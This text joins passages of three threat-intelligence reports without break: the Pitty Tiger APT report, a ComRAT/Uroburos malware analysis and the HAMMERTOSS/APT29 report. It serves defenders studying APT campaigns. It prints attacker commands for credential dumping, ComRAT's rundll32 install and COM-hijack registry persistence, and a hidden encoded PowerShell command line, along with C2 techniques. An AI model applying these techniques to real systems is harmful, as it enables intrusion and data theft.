    unlike the other c&cs used by the group, have been misconfigured.Once parsed and dumped, it
    provided us with more insight.We found several domains used by the Pitty Tiger group, the most interesting ones being detailed in
    this chapter.Pitty Tiger, like other APT attackers, often use anti-virus “familiar names” when registering domains
    or creating subdomains.Some examples can be avstore.com.tw, sophos.skypetm.com.tw,
    symantecs.com.tw, trendmicro.org.tw etc.Communication                            61.227.255.255
    Business Group

    Data              Taipei, Taiwan         61.220.0.0 -          61.220.209.17     qinoo.skypetm.com.tw   ?Telephone Ltd.    Hong Kong              113.10.240.255

    New World         Hong Kong City,        113.10.221.0 -        113.10.221.126    zeng.skypetm.com.tw    ?There is an increase in the registrations from
    2010 on.All the e-mail addresses used are connected to the Pitty Tiger group.Public release
    Threat Intelligence
                                                      “The Eye of the Tiger”                                  Page : 38/58

                                    Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “The Eye of the Tiger”




    VICTIMS
    Mapping the victims of such a targeted campaign is not an easy task.We have found the Pitty Tiger group to be very active against one particular private company from
    the defense industry and one academic network of a government, , yet we think it was done to be
    used as a proxy for some of the group’s operations.We have also found some connections from other companies to the c&c servers, yet we did not find
    evidence that they were real victims.These alleged victims do work in different sectors and are located mostly in European countries.   1 company from the defense industry;
           1 company from the energy industry;
           1 company from the telecommunications industry;
           1 company specialized in web development.It might be surprising to see a company specialized in web development here, yet it has built
    websites for interesting potential targets.We suspect Pitty Tiger to use this compromise to spear
    phish other companies which are in commercial relation with this web development company.We have to mention that we only had access to three of the several attackers’ servers.Therefore,
    we suppose the Pitty Tiger group could have more targets than what we could confirm.We also found a lot of vulnerability scanners launched by the attackers at different targets, yet there
    was no sign of compromise.During the course of our investigations, we discovered a RAR archive on the attacker’s server
    containing 5 Word documents and one small C source code.These documents belong to the
    defense company which has been compromised.According to the name of the files and the general
    feel of the archive, we do think it was extracted by the attackers to “show” someone what kind of
    data they could get from the compromise of that particular target.The documents were still
    exhibiting comments from various users, showing it was an ongoing work and not old documents.Interestingly enough, we saw a part of these documents appear on Virus-Total, with an additional
    “gift” from the attackers, a payload dropping a malware.There are only two options we can think of here:
        Someone from the same company has been targeted with this document. Someone from another company has been targeted with this document.This other company
           could be a partner or competitor.Since we were unable to determine the intended use of this specific document, we can only suppose
    that it could be used to provide commercial advantages to competitors of that company, or used by
    a foreign state.Public release
    Threat Intelligence
                                                “The Eye of the Tiger”                        Page : 39/58

                              Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “The Eye of the Tiger”




    ATTACKERS
    During our investigation, we found out interesting information about the Pitty Tiger group itself.After
    analyzing the various collected elements, we have tried to draw a portrait of this particular threat.A computer named CHMXY-PC connected to the c&c via RDP with IP address 58.61.40.5.This IP address belongs to an ADSL dynamic pool in the Wuhan area (Hubei’s
    provincial capital).IP address used by TIEWEISHIPC computer

    Some connections to the c&c originated from a computer named FLY-THINK with several IP
    addresses, all located in Fuqing (Fujian province).There are 11 IP addresses from Chinese dynamic ADSL
    ranges: 9 from Fuqing (Fujian province), one from Fuzhou (Fujian’s province capital) and one from
    Nanchang (Jiangxi’s province capital).The last one came from a VPS instance located in Los
    Angeles (California, USA) but purchased by a China based VPS provider XeVPS which belong to
    the AS38197 (Sun Network Hong Kong Limited).This information was still available when we got access to the c&c server.The c&c IP address, 198.100.113.27, can be seen there.Other log
    files showed that “Toot” is using virtual machines for his tests.We can also see the system: Microsoft Windows XP SP3.The “P” field is the language ID.Public release
    Threat Intelligence
                                                     “The Eye of the Tiger”                            Page : 45/58

                                   Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “The Eye of the Tiger”




    1028 means “Chinese traditional”.We have also seen tests run by “toot” with a language ID of 2052,
    which is “Chinese simplified”.The “M” field is probably used for versioning.It is a hardcoded string in the binary.After these tests, we could see some real connections to a victim using this RAT.Here is a follow-up
    of the commands launched by the bot controller, in a standard command-line shell:

    Command                                       Effect
    cd\temp                                       Folder change
    Dir                                           Lists the content of the folder.The
                                                  attacker here is probably looking for his
                                                  tools and does not remember if they
                                                  are there or in system32.cd\windows\system32                           Folder change
    dir tools*                                    Looking for tools.exe, a tool to fetch
                                                  different kind of credentials on the
                                                  system
    tools                                         The attacker wants to see what the
                                                  options are for the tool.tools –all                                    Tools.exe is launched.At this point, the output shows the
                                                  attackers only gets successfully one
                                                  MSN credential in clear text, login and
                                                  password, and one Microsoft Outlook
                                                  credential.type iecache.txt                              Shows the Internet Explorer cache to
                                                  the attacker.The output is huge.dir cmd.exe                                   Looking for cmd.exe
    del tools.exe                                 Remove the tools.exe after its use
    dir tools.exe                                 Checks to see if it has been
                                                  successfully deleted
    del iecache.txt                               Removes the IE cache log file.regedit -e 1.reg                              Dumps the content of this key to a file
    "HKEY_CURRENT_USER\Software\Microsoft\Windows named 1.reg
    NT\CurrentVersion\Windows"
    type 1.reg                                    Checks if dump has been successful.Public domain.Please note that at this point, the attacker has at least the privileges of a local administrator, since
    he is allowed to write content in the system32 folder of a Windows XP system.He could also gain
    the credentials to a sensitive e-mail account.In addition to all information already shown, we saw Toot connect to an account on a cloud service
    named “Baidu Drive”.The e-mail address linked to this account is dyanmips@qq.com (QQ-ID:
    2589315828).We could find traces of two other e-mail accounts associated to Toot,
    cisco_dyanmips@qq.com (QQ ID: 204156335) and cisco_dynamips@qq.com (QQ ID:
    1878836793).We did not find more information about user “Toot”, yet we miss Chinese language capabilities.Moreover, we have strong suspicions that there is not a single individual
    nicknamed “Trees and snow” but rather two programmers nicknamed “Trees” and “Snow”.“Trees”
    could also be “Cold”.We noticed that the symbol for this word is translated differently according to
    the context it is used in.Once again, we lack Chinese language skills.We identify the two nicknames on the current campaign as Automn Snow (秋雪) and Cold Air Kiss (
    风吻寒).While we are confident that these people are indeed the developers of both PittyTiger and CT RAT
    malware, we are not sure they belong to the PittyTiger group.These developers might just have
    been hired to develop these RATs.They might also just be selling it to the PittyTiger group.There is
    no trace of usage from other attacking groups, we believe the PittyTiger RAT is exclusively used by
    this group of attackers.ROLES AND ORGANIZATION
    According to indicators we gathered and threat activities profiling we have some hypothesis on the
    way the group is conducting its operations.We have strong evidence of a bot operator position.We identify one nickname for this position, the
    user known as TooT.As we did not see other nickname, we think that TooT is one person and not a
    group of persons.We also identified a malware development position.We identified two nicknames for this position on
    the current campaign, Automn Snow (秋雪) and Cold Air Kiss ( 风吻寒).Yet we are unsure that they
    belong to the group, they might just be a third party providing or selling their malware.We have a strong suspicion of a coordinator position, which coordinates the bot operator, provides
    him with some logistics support (weaponized document, tools…) and reviews the programmers
    work.This position could imply a communication channel with another manager.We named this position ‘Chen’, in relation with several references of this common Chinese name in
    c&c WHOIS and other investigation materials.We have some suspicion of a customer relationship manager position that may act as an interface
    between a customer and Chen.We named this position ‘Lilly’.Netpass.exe                         “Network Password Recovery” tool, to extract           Yes
                                        network passwords.iepv.exe /iepv-jiake.exe            “IE PassView” tool, to extract passwords from          Yes
                                        Internet Explorer.The file iepv-jiake.exe is the same, but crypted
                                        using a tool named DarkCrypt (DarkCrpt).routerpass.exe                      “Router PassView” tool, to extract credentials         Yes
                                        in some router backup files.pstpass.exe                         “PstPassword” tool, to extract Outlook’s PST           Yes
                                        files passwords.vncpass.exe                         “VNCPassView” tool, to extract passwords               Yes
                                        stored by the VNC tool.rdpv.exe                            “Remote Desktop PassView” tool, to extract             Yes
                                        the passwords from .RDP files.lookpass.exe                        Password revealer.Yes
    tools.exe, res.exe                  Multi             password              dumper:        No
                                        RDP,VNC,IE,ProtectedStorage,MSN,Wireless,
                                        etc.p2012.exe                           Controller for Paladin 2.1                             No
    p.exe                               Controller for Paladin 2.2                             No
    po.exe                              TCP Tunneling tool.No
    pp.exe                              Controller for Paladin 2.1                             No
    pr.exe                              Dotpot port scanner.Yes
    rar.exe                             Rar archiving tool, command-line version.Yes
    sff.exe                             File-searching tool to hunt for doc,txt,mdb,           No
                                        sec,eml,vsd,ppt,pps,dbx (SearchFile).ssql.exe                            MySQL scanner.No
    w7ij32.exe                          Windows 7 DLL injector.No
    ToyI.dll                            Keylogger.Can be used with w7ij32.exe                 No
    winspre.exe                         Troj/ReRol.A                                           No
    dr.asp                              Front-end for Troj/ReRol.A.No
    sk.exe                              Snake’s SkServer.   Network scanners (pr.exe)
           Network-oriented tools (po.exe)
           Vulnerability scanners (ssql.exe, Fluxay, etc.)What is rare to find is the controller part of those tools.We have been lucky enough to get the
    controller part of Pitty Tiger and CT RAT, and even to get a kind of hybrid controller made for CT
    RAT but also supporting Pitty Tiger.We suppose that the CT RAT is the new evolution of Pitty Tiger
    and that it will replace Pitty Tiger in the following months.The presence of a Chinese version of “calc.exe”, the official calculator provided in Microsoft
    Windows, is interesting.Not only is it one more indicator of a probable Chinese origin, but also an
    indicator that this server was probably used as a test base, in addition to being operational and
    controlling infected machines from different targets.In addition to those tools, we found some interesting scripts.This file is 67320
    lines long, and uses 5610 different passwords for each of 12 users contained in this file.The user
    names are clearly the result from a user enumeration and are dedicated to a particular French
    victim.The passwords listed in this file are either build from several campaigns or from the current
    campaign.A lot of passwords are related to the targeted company and might be previous passwords
    from users.We have also discovered a pack of files which can be used to trigger an Internet Explorer
    vulnerability (CVE-2014-0322).The date of these files, namely Tope.swf and index.html, was
    2014/02/18, a few days after the revelation of existing exploits in the wild used in APT attacks1.We do not know if the Pitty Tiger group used this exploit or not, but found no trace indicating they
    did.A lot of different attackers seem to have used that vulnerability since.1
     http://www.symantec.com/connect/blogs/new-internet-explorer-10-zero-day-discovered-watering-
       hole-attack
    Public release
    Threat Intelligence
                                               “The Eye of the Tiger”                        Page : 52/58

                             Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “The Eye of the Tiger”




    ATTRIBUTION
    Determining who is exactly behind an APT campaign is difficult.We tried to extract different
    technical indicators, together with contextual elements.Information relating to the tools used by the attackers has been leveraged for attribution:

           Several Chinese vulnerability scanners have been launched against targets;
           Several Chinese tools have been used and found on the c&c servers of the attackers:
            8uFTP, a Chinese version of calc.exe, etc.;
           Two of the used RATs have been developed by the same developers: CT RAT and
            PittyTiger RAT.Public release
    Threat Intelligence
                                                “The Eye of the Tiger”                        Page : 55/58

                              Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “The Eye of the Tiger”




    CONCLUSION
    Pitty Tiger is a group of attackers that have been active since at least 2011.Pitty Tiger is effective and mature in the use of targeted malware, the use of known exploits to infect
    computers with their malware and the creation of an infrastructure to efficiently conduct APT attacks.They are quite unprofessional in their way of using their infrastructure: they do launch vulnerability
    scanners directly from a c&c server and also use their connection for personal activities
    (downloading pornographic material for example, as we have seen a whole folder on a c&c server
    full of xxx torrent links).Pitty Tiger is probably not a state-sponsored group of attackers.The attackers lack the experience
    and financial support that one would expect from state-sponsored attackers.We suppose this group
    is opportunistic and sells its services to probable competitors of their targets in the private sector.One governmental network has been targeted by the group, yet we do not have any evidence of the
    purpose of this attack.We suppose this particular attack has been executed to provide a usable
    bounce for the group.The campaign we studied has been largely focused on one particular target.We suspect the Pitty
    Tiger group to work according to an opportunistic business model: this group might offer its services
    to third parties from the private sector.This group seems to be very small compared to other APT groups.We have leveraged several
    profiles and could identify some attackers to a certain extent.We believe this group might keep
    working as it is now, with limited budgets, or grow to extend its attacking campaign capabilities.Public release
    Threat Intelligence
                                                “The Eye of the Tiger”                        Page : 56/58

                              Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “The Eye of the Tiger”




    INDICATORS
    This list of indicators is provided in order to help people detect Pitty Tiger APT campaign.File string                           MM RAT
    get file ok %u bytes                                     File string                            CT RAT
    ok sleep %d minutes.The Uroburos case: new sophisticated RAT identified
In February 2014, the experts of the G DATA SecurityLabs published an analysis of Uroburos, the
rootkit with Russian roots.We explained that a link exists between Uroburos and the Agent.BTZ
malware, which was responsible for "the most significant breach of U.S. military computers ever."[1] Nine months later, after the buzz around Uroburos, aka Snake or Turla, we now identified a new
generation of Agent.BTZ We dubbed it ComRAT and, by now, analyzed two versions of the threat
(v3.25 and v3.26).As reported earlier this year, Agent.BTZ used the same encoding key and the installation log file name as Uroburos.ComRAT, in its version 3.25, shows the same behavior.Furthermore, the attackers also shared a C&C domain.The
latest version of ComRAT known to us (v3.26) uses a new key and does not create the installation log file, in order to
complicate the analysis and to disguise the link between the two cases.Another very interesting fact: the attackers use COM Object hijacking, the same persistence mechanism as
COMpfun, which we described recently.Taken everything into consideration, the indications we saw during our analyzes lead to the supposition that the
group behind Agent.BTZ and Uroburos is still active and is pursuing the Agent.BTZ path once more to improve and
change the RAT.Dropper

The analyzed file is the latest version we identified: v3.26.The version identification is described in the chapter “Log
files”.The major difference between this version and the older version(s) will be described there.File installation

The first task of the malware is to install the file credprov.tlb in %APPDATA%\Microsoft\.This file is the main
payload of the malware.The dropper executes the following command in order to install a second file:

rundll32.exe %APPDATA%\Microsoft\credprov.tlb,Install %APPDATA%\Microsoft\shdocvw.tlp

The second file is shdocw.tlp.The two files are Microsoft Windows dynamic libraries.Persistence

To be started during the boot process of the infected machine, the malware creates the following registry key:

HKCU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32 =
%APPDATA%\shdocvw.tlp

This registry key is used to associate the library shdocvw.tlp to the object 42aedc87-2188-41fd-b9a3-0c966feabec1
as previously explained in the article about COMpfun.The purpose is to load the library into each and every process
executed on the infected system.Dropper’s log file

If the version of the malware is older than 3.26, the dropper creates an additional file called winview.ocx.We
noticed that the file name is still the same as the file name used by Agent.BTZ in the past.In contrast to this, in our Uroburos analysis, we found out that Uroburos does
not install itself in case a version of Agent.BTZ was found on a system.Execution flow and features

During the startup of the infected machine, the shdocvw.tlp library is loaded into all processes.If the process is
explorer.exe, this library will load the other library called credprov.tlb.This library is the real payload.Its features
are common for a Remote Administration Tool (RAT):

      command execution;
      file download;
      file upload;
      information gathering.ComRAT’s communication to the command and control server is performed by the browser process and not by
explorer.exe in order to avoid being blocked by a firewall on the system or any additional security products.The
communication between the processes is performed by named pipe.Log files

Two log files are created during the malware execution: mskfp32.ocx and msvcrtd.tlb.If the malware version is
older than 3.26, the xored key is the same as the dropper key.Concerning the version 3.26, the malware uses a new
non-ASCII key.The command and control server information is
stored in the registry, not in an XML, and encoded:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\SessionMRU\IPlace

For example, in the analyzed sample the CC is: weather-online.hopto.org.This domain is far from unknown, as it
has been mentioned in BAE System’s Uroburos (aka Snake) analysis paper as C&C server domain for the Uroburos
malware.Another connection between the cases.The same code was used by Agent.BTZ
      and also the dll loaded into userland during the Uroburos analysis.Command and control server domains are shared between Uroburos and ComRAT.Differences:

      In version 3.26, the author changed the key and remove the known file name
      This action can be an indication for the developer’s effort to hide this connection
      The main difference is the design
      Agent.BTZ is a common RAT, a simple library executed on an infected machine.ComRAT is more complex
      and cleverer.The malware is loaded into each and every process of the infected machine and the main part
      (payload) of the malware is only executed in explorer.exe.Furthermore, the C&C communication blends into
      the usual browser traffic and the malware communicates to the browser by named pipe.It is by far a more
      complex userland design than Agent.BTZ.These differences, mainly the more complex design, lead us to give this malware a new name.The analyzed dropper of v3.25 has a compilation date of February 6th 2014.The more recent dropper of v3.26,
which has all the mentioned changes implemented, reveals a compilation date of January 3rd 2013.We suspect that
this date is spoofed in order to disguise that this is in fact a newer version.Conclusion

This analysis shows that even after the Uroburos publication in February 2014, the group behind this piece of
malware seems to be still active.In any case, the ComRAT developers implemented new mechanisms, changed keys,
removed log files to hide their activities and tried to disguise the connections between the RAT ComRAT, the rootkit
Uroburos and the RAT Agent.BTZ as much as possible.However, we can still follow the evolution of the malware by
comparing the versions.The persistence mechanism discovered in October 2014 makes it possible to intrude into a system in a really discreet
manner and we estimate that other actors will use the same persistence mechanism in the near future.We will definitely keep our ears and eyes open and continue analyzing.In early 2015,  

we came across stealthy malware—which we  
call HAMMERTOSS—from an advanced 
persistent threat group that we suspect the 
Russian government sponsors.We designate  
this group APT29.Using a variety of techniques—from creating an 
algorithim that generates daily Twitter handles 
to embedding pictures with commands—the 
developers behind HAMMERTOSS have devised 
a particularly effective tool.APT29 tries to 
undermine the detection of the malware by 
adding layers of obfuscation and mimicking  

the behavior of legitimate users.HAMMERTOSS 
uses Twitter, GitHub, and cloud storage services 
to relay commands and extract data from 
compromised networks.Using a variety of techniques—from 
creating algorithms that generate daily 
Twitter handles to embedding pictures 
with commands—the developers 
behind HAMMERTOSS have devised 
a particularly effective tool.3333

HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat GroupSPECIAL REPORTHAMMERTOSS works by:

1.Retrieving 
commands via 
legitimate web 
services, such 
as Twitter and 
GitHub, or using 
compromised 
web servers for 
command-and-
control (CnC).5.Extracting 
information from 
a compromised 
network and 
uploading files 
to cloud storage 
services.2.Visiting different 
Twitter handles daily 
and automatically.3.Using timed starts—
communicating after 
a specific date or only 
during the victim’s 
workweek.4.Obtaining commands via 
images containing hidden and 
encrypted data.While none of these tactics are new, the combination of these 
techniques piqued our interest.We suspect the Russian 
government sponsors the group because of 
the organizations it targets and the data it 
steals.Additionally, APT29 appeared to cease 
operations on Russian holidays, and their work 
hours seem to to align with the UTC +3 time 
zone, which contains cities such as Moscow  
and St. Petersburg.While other APT groups try to cover their 
tracks to thwart investigators, very few groups 
show the same discipline and consistency.Similarly, few groups display the ability to adapt 
to network defenders’ attempts to mitigate its 
activity or remove it from victim networks.For 
example, APT29 almost always uses anti-forensic 
techniques, and they monitor victim remediation 
efforts to subvert them.Likewise, the group 
appears to almost solely uses compromised 
servers for CnC to enhance the security of its 
operations and maintains a rapid development 
cycle for its malware by quickly modifying tools to 
undermine detection.These aspects make APT29 
one of the most capable APT groups that we track.55

HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat GroupSPECIAL REPORTINTRODUCING HAMMERTOSS

W e first identified 

HAMMERTOSS in early 
2015.APT29 likely used 

HAMMERTOSS as a backup for their two 
primary backdoors to execute commands 
and maintain access if the group’s principal 
tools were discovered.We have identified 
two HAMMERTOSS variants that give 
APT29 alternative ways to communicate 
with the malware.The developer appears 
to name these variants uploader and 
tDiscoverer.1  Both variants are written 
in the C# programming language.Each 

variant uses different methods to acquire 
CnC instructions, either by directly 
accessing a hard-coded website or 
accessing Twitter as an intermediary.•  Uploader is preconfigured to use a 

hard-coded server for its CnC.It goes 
to a specific URL to obtain an image 
with a specific file size.•  tDiscoverer uses an additional layer of 
obfuscation by first going to Twitter to 
obtain a CnC URL, before visiting the 
URL to acquire its target image.We will focus on tDiscoverer in this report.Five Stages of HAMMERTOSS
We have broken down the malware 
communication process into five stages 
to explain how the tool operates, 
receives instructions, and extracts 
information from victim networks.The 
stages include information on what 
APT29 does outside of the compromised 
network to communicate with 
HAMMERTOSS and a brief assessment 
of the tool’s ability to mask its activity.1.The HAMMERTOSS 
backdoor generates and looks 
for a different Twitter handle 
each day.It uses an algorithm 
to generate the daily handle, 
such as “234Bob234”, before 
attempting to visit the 
corresponding Twitter page.If the threat group has not 
registered that day’s handle, 
HAMMERTOSS will wait until 
the next day and look for a 
different handle.1

 5

5.HAMMERTOSS processes 
the decrypted commands, which 
may instruct the malware to 
conduct reconnaissance, execute 
commands via PowerShell, or 
upload data to a cloud storage 
service.4.The image looks normal, 
but actually contains hidden 
and encrypted data using 
steganography.HAMMERTOSS decrypts the 
hidden data to obtain commands.4

010111101101 
111011011110 
 010111101 
10 010111101 

 2

TWEETS

1

bobby
@1abBob52b

Tweets     Tweet & replies

bobby @1abBob52b   •  July 29 
Follow doctorhandbook.com #101docto

2.HAMMERTOSS visits the 
associated Twitter account 
and looks for a tweet with 
a URL and a hashtag that 
indicates the location and 
minimum size of an image file.3

3.HAMMERTOSS visits 
the URL and obtains an 
image.Note: The images are 
stock photography and 
were not used by the 
group.1 The “tDiscoverer” variants were originally named “tDiscoverer.exe,” and the “Uploader” variants had a debug path containing “uploader.pdb.”

66

HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat GroupSPECIAL REPORTSTAGE 1:  
The Communication Process Begins with Twitter   

 1

 2

TWEETS

1

bobby
@1abBob52b

Tweets     Tweet & replies

bobby @1abBob52b   •  July 29 
Follow doctorhandbook.com #101docto

 3

3a.APT29’s operator registers 
the handle.HAMMERTOSS goes to the 
Twitter page and looks for a 
tweet that provides instructions 
on the next phase of the process.3b.APT29’s operator does not 
register the handle.HAMMERTOSS waits until the 
next day to begin the process 
again.2.HAMMERTOSS visits 
the Twitter URL related 
to its daily Twitter handle.For instance, on July 29, 
it may look for a handle 
1abBob52b (hxxps://twitter.com/1abBob52b).Figure 1: HAMMERTOSS calls out to a Twitter handle

HAMMERTOSS first looks for 

The malware contains an 

instructions on Twitter.algorithm that generates a daily Twitter 
handle, which is an account user ID.To create the handles, the algorithm 
employs a basename, such as “Bob,” and 
appends and prepends three CRC32 
values based on the date.For example, 
“1abBob52b” would have the URL: 
hxxps://twitter.com/1abBob52b.Each 
HAMMERTOSS sample will create a 
different Twitter handle each day.APT29 knows the algorithm used to 
generate the handles and chooses 
to register a Twitter handle and post 
obfuscated instructions to the handle’s 
URL before the malware attempts to 
query it.If a particular day’s handle 
is not registered and the URL for that 
day is not found, HAMMERTOSS will 
wait until the next day to attempt to 
communicate with another handle.APT29 typically configures 
HAMMERTOSS to communicate 
within certain restrictions, such as 
only checking the Twitter handle on 
weekdays or after a specified start date.This allows the malware to blend in to 
“normal” traffic during the victim’s work 
week or to remain dormant for a period  
of time before activating.77

HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat GroupSPECIAL REPORTAPT29’s operator chooses to register a particular day’s Twitter handle using the same algorithm ahead of the anticipated communication.1.HAMMERTOSS contains an algorithm that generates Twitter handles telling the malware to visit a specific Twitter handle on a specific day.A Twitter handle is a user ID associated with Twitter’s website.For instance, FireEye’s Twitter handle, @FireEye, has a URL: https://www.twitter.com/fireeye.The HAMMERTOSS algorithm uses a basename, like “Bob,” and appends and prepends three CRC32 values based on the current date.An example, may be 1abBob52b, which would have the URL: hxxps://www.twitter.com/1abBob52b.STAGE 2:  
Tweeting a URL, Minimum File Size of an Image,  
and Part of an Encryption Key

If APT29’s operator has registered that 
particular day’s handle, he will tweet a URL 
and hashtag.TWEETS

1

bobby
@1abBob52b

Tweets     Tweet & replies

bobby @1abBob52b   •  July 29 
Follow doctorhandbook.com #101docto

URL: In the case above, 
the tweet instructs 
HAMMERTOSS to download 
the content hosted at the 
specified URL, including any 
images on the page.In the 
example we will discuss later, 
the tweet included a URL on 
GitHub.Hashtag: The tweet also 
contains a hashtag with 
information to allow 
HAMMERTOSS to extract 
encrypted instructions from 
an image file.The hashtag 
indicates that the hidden 
data is offset 101 bytes 
into the image file and the 
characters to be used for 
decryption are docto.If APT29 has registered that day’s Twitter handle, 

they will tweet a URL and a hashtag.The URL 
directs HAMMERTOSS to a webpage containing 
an image or images.The hashtag provides a number 
representing a location within the image file and 
characters for appending to an encryption key 
to decrypt instructions within the image.In the 
mockup of a HAMMERTOSS tweet in Figure 2, 
the hashtag was #101docto, indicating that the 
encrypted data begins at an offset of 101 bytes into 
the image file, and the characters docto should be 
added to the encryption key to decrypt the data.Using Twitter as an intermediary to deliver the 
second-stage CnC to HAMERTOSS allows APT29 
to dynamically direct the tool.88

HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat GroupSPECIAL REPORTFigure 2: Learning the URL, image size, and encryption keyIn Figure 3 is a sample of the HAMMERTOSS tDiscoverer variant and a corresponding 
snapshot of a Twitter account page from one of its generated handles.At the time of 
publication, a publicly available HAMMERTOSS sample had only five generic detections 
in VirusTotal.The Twitter account was active and contained a link to a website.MD5: 

SHA1:

d3109c83e07dd5d7fe032dc80c581d08 (VirusTotal)

42e6da9a08802b5ce5d1f754d4567665637b47bc

Timing Behavior: 

Communicate on weekdays only after April 3, 2015

Active Twitter Handle:

twitter[.]com/3c6Diallo7f0 (Figure 3 below)

Tweeted URL, Hashtag:

hxxp://www[.]doctorhandbook[.]com, #101docto

Detection Ratio: 

5/56

Metadata:

2“Miniduke still duking it out.” ESET Security.20 May 2014. http://www.welivesecurity.com/2014/05/20/miniduke-still-duking/ Balazs, Biro, Christian Istrate, and Mairus Tivaradar.A Closer Look at 
MiniDuke.BitDefender.2013. http://labs.bitdefender.com/wp-content/uploads/downloads/2013/04/MiniDuke_Paper_Final.pdf.James, Peter.Flashback Mac Malware Uses Twitter as Command and 
Control Center.Intego’s The Mac Security Blog.5 March 2012. http://www.intego.com/mac-security-blog/flashback-mac-malware-uses-twitter-as-command-and-control-center.Coogan, Peter.“Twittering Botnets.” Symantec Security Blog.14 Aug 2009. http://www.symantec.com/connect/blogs/twittering-botnets.Kessler, Michelle.“Hackers harness Twitter to do their dirty work.” USA Today.17 August 2008. http://content.usatoday.com/communities/technologylive/post/2009/08/68497133/1#.VbJVi4q9_Vs.99

HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat GroupSPECIAL REPORTFigure 3: Twitter page for d3109c83e07dd5d7fe032dc80c581d08HIDING  AMONG UNREGISTERED TWITTER ACCOUNTSHAMMERTOSS uses an algorithm to generate hundreds of Twitter handles annually for potential CnC.Many of these are unregistered, as APT29 chooses to register a particular day’s handle as needed and ahead of an anticipated HAMMERTOSS beacon.This small number of registered accounts allows the group to maintain a small footprint.Other tools use Twitter to relay instructions, including:2  •	MiniDuke,	a	Windows-based	backdoor	that	is	a	suspected	Russian tool•	the	Sninfs	botnet•	Flashback,	a	Mac-based	backdoorMiniDuke	behaves	similarly	to HAMMERTOSS by not only using Twitter for CnC, but also by downloading image files containing encrypted, appended content.STAGE 3:  
Visiting GitHub to Download an Image

APT29’s operator registers a GitHub 
page and uploads an image.HAMMERTOSS uses the InternetExplorer.Application COM  Object to visit the URL and 
obtain the image.HAMMERTOSS then uses the InternetExplorer.Application COM Object to visit the URL specified in 
a tweet.We have observed URLs lead to specific GitHub 

accounts or compromised websites.We will use Github for the next part in our example.Once 
HAMMERTOSS obtains the GitHub URL from its daily Twitter 
account, it visits the URL and downloads the contents of the 
page, including any image files.1010

HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat GroupSPECIAL REPORTFigure 4: The URL specified in the tweet (in this case, a GitHub page) contains an image with appended and encrypted dataSTAGE 4:  
APT29 Employs Basic Steganography

1.HAMMERTOSS 
downloads the image 
from the specified URL, 
retrieves the image 
from Internet Explorer’s 
browser cache, and 
begins the process of 
decryption.1

2.Though the image 
looks normal, it 
contains appended and 
encrypted content.2

HAMMERTOSS downloads the 

contents of the website to 
Internet Explorer’s browser cache 

and searches the cache for any images 
at least as large as the offset specified in 
the tweet from Stage 2.While the image appears normal, 
it actually contains steganographic 
data.Steganography is the practice of 
concealing a message, image, or file 
within another message, image, or file.In 
this case, the image contains appended 
and encrypted data that HAMMERTOSS 
will decrypt and execute.The data may 
include commands or login credentials to 
upload a victim’s data to a cloud storage 
service.HAMMERTOSS locates the 
encrypted data at the offset specified in 
the tweet in Stage 2.It decrypts the data 
using a key comprised of hard-coded 
data from the malware binary appended 
with the characters from the tweet.Figure 5: Encrypted data appended beyond 
the FF D9 JPEG End of File marker

APT29 ADDING 
STEGANOGRAPHY  
AS ANOTHER LAYER 
OF OBFUSCATION

 3

010111101101 
111011011110 
 010111101 
10 010111101 

3.HAMMERTOSS decrypts the image using a hard-coded key 
appended with the characters obtained from the tweet in Stage 2.End of File Marker

appended data is encrypted, so 
even if detected, the investigator 
would be unable to decrypt the 
data without key material from 
two sources: the malware binary 
and the current tweet.Indicative of APT29’s discipline, 
the group ensures that if 
network defenders discover 

the images, the defenders still 
require the malware sample, 
corresponding Twitter handle, 
and tweet with the additional 
key material to decrypt the tool’s 
instructions.All of the samples 
we have observed have used 
different encryption keys to 
decrypt the appended content.1111

HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat GroupSPECIAL REPORTWe have observed only a few APT groups using steganography.HAMMERTOSS uses steganography by appending data to an image file after the image’s end of file marker.This technique would be readily detectable if someone was checking for it.However, the STAGE 5:  
Executing Commands and Uploading Victim Data 

APT29’s operator creates the cloud storage account and can 
obtain the victim’s data from the cloud storage service.1

1.HAMMERTOSS may issue 
other follow on commands: 
powershell -ExecutionPolicy 
bypass -WindowStyle hidden –
encodedCommand...

010111101101111000101001100101 

1110110111100010100110 01011110110111100010100110 

 2

010111101101111000101001100101111 

0110111100010100110

Figure 6: Executing Commands and Removing Data 

2.HAMMERTOSS is capable of uploading victim 
data to a cloud storage service.The encrypted data in the image may include 

instructions to execute commands via 
PowerShell, execute a direct command or 
file, or save an executable to disk and execute it.In several cases, the commands directed 
HAMMERTOSS to upload information from 
victim networks to accounts on cloud storage 
services using login credentials received in  

Stage 4.In our GitHub example, the decrypted 
data instructed the backdoor to obtain a list of 
running tasks—reconnaissance on the victim 
network—and upload it to a specific account on a 
cloud storage service using the login credentials.APT29 can then easily obtain the extracted 
information from the cloud storage service at 
their convenience.1212

HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat GroupSPECIAL REPORTCONCLUSION  
Difficulty Identifying Accounts, Discerning Legitimate 
and Malicious Traffic, and Locating the Payload

HAMMERTOSS undermines network 

defenders’ ability to identify Twitter 
accounts used for CnC, discern malicious 

network traffic from legitimate activity, and  
locate the malicious payloads downloaded by  
the malware.•  Identifying daily potential Twitter accounts 

requires network defenders to have access to 
the associated HAMMERTOSS binary and to 
reverse engineer it to identify the basename 
and the algorithm used to create the potential 
accounts.Monitoring malicious tweets from 
these accounts is difficult as each sample is 
capable of generating hundreds of potential 
Twitter accounts annually, and APT29 may 
only register a small number of those accounts 
for CnC.•  Employing legitimate web services that are 
widely allowed in organizations’ networks—
some of which use Secure Sockets Layer 
connections that ensure the communications 
